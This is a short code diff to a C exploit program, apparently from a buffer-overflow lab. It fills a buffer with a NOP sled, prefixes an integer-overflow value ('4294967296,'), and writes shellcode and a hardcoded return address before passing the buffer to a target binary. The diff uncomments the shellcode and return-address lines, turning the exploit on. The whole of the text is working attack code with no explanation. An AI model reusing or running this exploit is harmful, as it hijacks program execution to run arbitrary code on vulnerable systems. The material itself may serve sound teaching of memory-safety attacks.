@@ -14,13 +14,10 @@ int main(void)
   memset(buf, 0x90, 241*20);
 
   strncpy(buf, "4294967296,", 11);
-  //strncpy(buf+(235*20), shellcode, 45);
-  
-  // IGNORE strncpy(buf+240, "\x70", 1);
-  
-  //strncpy(buf+(240*20)+4, "\x08\xfd\xff\xbf", 4);
-  
-  // IGNORE strncpy(buf+244, "\x12\x34\x56\x78", 4);
+  strncpy(buf+(235*20), shellcode, 45);
+  // strncpy(buf+240, "\x70", 1);
+  strncpy(buf+(240*20)+4, "\x08\xfd\xff\xbf", 4);
+  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
   
   args[0] = TARGET; 
   args[1] = buf;
